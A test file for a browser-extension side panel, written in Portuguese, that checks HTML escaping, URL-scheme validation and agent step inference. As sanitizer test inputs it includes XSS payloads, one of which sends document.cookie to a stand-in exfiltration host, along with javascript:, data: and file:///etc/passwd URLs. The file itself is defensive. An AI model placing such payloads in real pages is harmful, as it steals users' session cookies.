import { describe, expect, it } from 'bun:test';
import { escapeHtml, urlSegura } from '../entrypoints/sidepanel/escape';
import { agenteDaMensagem, ETAPAS, inferirEtapa } from '../entrypoints/sidepanel/etapa';

describe('escapeHtml: fronteira de segurança do painel', () => {
  it('neutraliza as cinco entidades que abrem marcação/atributo', () => {
    expect(escapeHtml('<img src=x onerror=alert(1)>')).toBe('&lt;img src=x onerror=alert(1)&gt;');
    expect(escapeHtml('a"b')).toBe('a&quot;b');
    expect(escapeHtml("a'b")).toBe('a&#039;b');
    // O & primeiro: escapar depois produziria &amp;lt; duplo.
    expect(escapeHtml('&lt;')).toBe('&amp;lt;');
  });

  it('preserva texto normal (o painel não pode mostrar lixo em toda frase)', () => {
    expect(escapeHtml('Preenchi os campos. Confira e envie.')).toBe('Preenchi os campos. Confira e envie.');
    expect(escapeHtml('Razão Social — 2ª via')).toBe('Razão Social — 2ª via');
  });

  it('corta um payload de script colado num rótulo', () => {
    const malicioso = '"><script>fetch("https://exfil.com?c="+document.cookie)</script>';
    const saida = escapeHtml(malicioso);
    expect(saida).not.toContain('<script>');
    expect(saida).not.toContain('"');
  });
});

describe('urlSegura: esquema do link de login', () => {
  it('aceita http(s), que é o que o CLI oficial imprime', () => {
    expect(urlSegura('https://auth.openai.com/codex/device')).toBe('https://auth.openai.com/codex/device');
    expect(urlSegura('http://localhost:3000/x')).toBe('http://localhost:3000/x');
  });

  it('recusa javascript:, data: e file: (escapar não protegeria)', () => {
    expect(urlSegura('javascript:alert(1)')).toBeNull();
    expect(urlSegura('JavaScript:alert(1)')).toBeNull();
    expect(urlSegura('data:text/html,<script>alert(1)</script>')).toBeNull();
    expect(urlSegura('file:///etc/passwd')).toBeNull();
    expect(urlSegura('chrome-extension://abc/popup.html')).toBeNull();
  });

  it('recusa lixo que não é URL', () => {
    expect(urlSegura('accounts.google.com sem esquema')).toBeNull();
    expect(urlSegura('')).toBeNull();
  });
});

describe('inferirEtapa: deduzir o passo a partir do texto da IA', () => {
  it('lendo → preenchendo → conferindo, na ordem em que o trabalho acontece', () => {
    expect(inferirEtapa('Mapeando elementos e botões da página…')).toBe(0);
    expect(inferirEtapa('Preenchendo: 123')).toBe(1);
    expect(inferirEtapa('Conferindo os valores')).toBe(2);
  });

  it('"clicando" é preenchendo (é a IA mexendo na página)', () => {
    expect(inferirEtapa('Clicando no elemento…')).toBe(1);
    expect(inferirEtapa('Escrevendo no campo')).toBe(1);
  });

  it('nunca anda para trás nem pula etapa (a barra só progride)', () => {
    // A IA reenvia um texto antigo depois de "conferindo": a etapa não pode voltar a 0.
    const etapas = ['Conferindo', 'Mapeando', 'Preenchendo'].map(inferirEtapa);
    expect(etapas).toEqual([2, 0, 1]);
  });

  it('texto desconhecido fica em "lendo" em vez de quebrar', () => {
    expect(inferirEtapa('')).toBe(0);
    expect(inferirEtapa('🗺️ MAPA DO SITE CONHECIDO')).toBe(0);
  });

  it('as três etapas existem e são rotuladas', () => {
    expect(ETAPAS).toEqual(['Lendo', 'Preenchendo', 'Conferindo']);
  });
});

describe('agenteDaMensagem: quem mostra o texto', () => {
  it('scout mostra na leitura, synthesizer nos dados', () => {
    expect(agenteDaMensagem('scout')).toBe('scout');
    expect(agenteDaMensagem('synthesizer')).toBe('synthesizer');
  });

  it('sem papel definido, mostra nos dois (antes, o texto sumia do synthesizer)', () => {
    expect(agenteDaMensagem(undefined)).toBe('ambos');
    expect(agenteDaMensagem('geral')).toBe('ambos');
  });
});
